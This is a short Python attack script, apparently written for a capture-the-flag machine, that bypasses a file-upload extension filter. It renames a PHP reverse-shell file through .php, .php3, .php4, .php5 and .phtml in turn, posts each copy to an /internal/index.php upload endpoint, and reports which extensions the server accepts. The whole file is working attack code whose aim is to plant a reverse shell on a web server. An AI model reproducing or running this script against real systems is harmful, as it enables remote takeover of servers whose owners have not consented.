#!/usr/bin/env python

import requests
import os

ip = "10.10.17.9"
url = f"http://{ip}:3333/internal/index.php"

old_file_name = "php-reverse-shell.php"
filename = "php-reverse-shell"
extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml",
]

for ext in extensions:
    newfile_name = filename+ext
    print(f"trying {ext}")
    os.rename(old_file_name, newfile_name)
   # r = requests.get("https://google.com")
   # print(r.text)
    files = {"file": open(newfile_name, "rb")}
    r = requests.post(url,files=files)

    if("Extension not allowed" in r.text):
        print(f"{newfile_name} NOT ALLOWED")
    else:
        print(f"{newfile_name} seems to be allowed")
    old_file_name = newfile_name
